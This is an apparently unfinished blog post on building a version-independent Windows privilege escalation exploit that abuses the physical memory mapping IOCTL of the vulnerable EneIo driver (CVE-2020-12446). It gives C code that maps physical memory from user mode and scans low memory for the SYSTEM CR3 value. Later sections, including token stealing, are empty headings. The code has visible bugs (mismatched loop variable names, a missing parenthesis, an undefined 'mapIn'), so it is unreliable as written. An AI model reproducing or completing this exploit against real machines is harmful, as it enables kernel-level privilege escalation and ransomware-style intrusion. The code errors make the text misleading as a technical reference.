[Home](https://plackyhacker.github.io)

# Version Independent Physical Memory Read/Write Privilege Escalation

This is my first post since passing the [Offensive Security Exploitation Expert](https://www.offsec.com/courses/exp-401/) exam. I suppose it is now time to start practicing my chosen tradecraft. I am currently studying a vulnerability that was discovered in early 2025, was being used in ransomware attacks, but doesn't have a public exploit (that I am aware of). I will be posting something about that shortly.

This got me thinking about how I might write a privilege escalation exploit that is operating system version independent. I decided to look at [CVE-2020-12446](https://nvd.nist.gov/vuln/detail/CVE-2020-12446) which has multiple vulnerabilities leading to privilege escalation.

The CVE isn't really what I am interested in, any CVE with a physical read/write primitive would do.

# The Basics

If you are reading this then I assume you know how a driver works and how we can connect to it from user-mode. If not, feel free to read some of my other posts. The symbolic name for the driver is `\\.\EneIo` and the vulnerable IOCTL I decided to target is `0x80102040`. Short story: this IOCTL maps the physical memory in kernel-space to a virtual address space in user-space.

The code snippet below shows how we can map the physical memory space to a virtual allocation:

```c
// user-mode data structure
typedef struct _MAPPHYSTOVA {
    ULONGLONG Size;
    ULONGLONG Ignore2;
    ULONGLONG Ignore3;
    ULONGLONG MappingAddress;
    ULONGLONG Ignore5;
} MAPPHYSTOVA, * PMAPPHYSTOVA;

// ...


// send IOCTL to map memory
ULONGLONG MapMemory(HANDLE hDevice, ULONGLONG* SizeOfMapping) {
    DWORD bytesReturned = 0;

    MAPPHYSTOVA map = { 0 };

    BOOL result = DeviceIoControl(hDevice, IOCTL_WINIO_MAPPHYSTOVA, &map, sizeof(map), &map, sizeof(map), &bytesReturned, NULL);

    *SizeOfMapping = map.Size;
    return mapIn.MappingAddress;
}
```

The struct contains five `ULONGLONG` fields but only two of them are used: `Size` is the size of the mapping, and `MappingAddress` the virtual allocation that has been assigned by the kernel. Notice that the `map` variable is passed in as the user input and the user output. Once the `DeviceIOControl` is completed the `map` variable is popoulated with the two revelant variables.

# Virtual Address to Physical Memory Mapping



# Dicovering the CR3 Value

In the Windows OS the `HalpLMStub` function is the final stub call, in a series of stubs, that applies page tables and performs various initialisation before jumping to the main kernel. A reference to this function is written to physical memory between addresses `0x10000` and `0x20000` and is randomised. 

Within the same page is a value that is to be loaded in to the `SYSTEM` `cr3` register. The `cr3` register contains a pointer to the first page table, the PML4 table.

To make things easier the two values are at predictable locations within the page. The `HalpLMStub` pointer is at offset `+0x70` and the `cr3` value is at offset `+0xa0`.

Once we have a mapping of physical memory we can search the pages between `0x10000` and `0x20000` and do pattern matching at these offsets to find the page which the stub pointer exists and the base address of the PML4 table.

```c
DWORD FindCR3Value(ULONGLONG VirtualAddressBase, DWORD* cr3Page) {

    DWORD count = 0;

    // the final stub reference is always between 0x10000 and 0x20000
    for (DWORD page = 0x10000; pageIndex <= 0x20000; pageIndex += 0x1000) {
        // CR3 value is at an offset of 0xA0
        DWORD64 potential_cr3 = *((DWORD64*)((BYTE*)VirtualAddressBase + page + 0xA0));

        if ((potential_cr3 & 0xFFF) == 0 &&
            ((potential_cr3 >> 12) & 0xF) != 0 && ((potential_cr3 >> 16) & 0xF) != 0 && ((potential_cr3 >> 20) & 0xF) != 0 &&
            (potential_cr3 >> 24) == 0) {

            // halpLMStub reference is at an offset of 0x70
            DWORD64 checkHalpLMStub = *((DWORD64*)(BYTE*)VirtualAddressBase + page + 0x70));
            if ((checkHalpLMStub & 0xfffff80000000000) == 0xfffff80000000000) {
                *cr3Page = page;
                return ((DWORD)potential_cr3 & 0xFFFFFFFF);
            }
        }
    }

    return 0;
}
```



# Discovering NTOSKRNL Base

# Discovering Processes

# Discovering Privileged Processes

# Token Stealing

# Conclusion

[Home](https://plackyhacker.github.io)
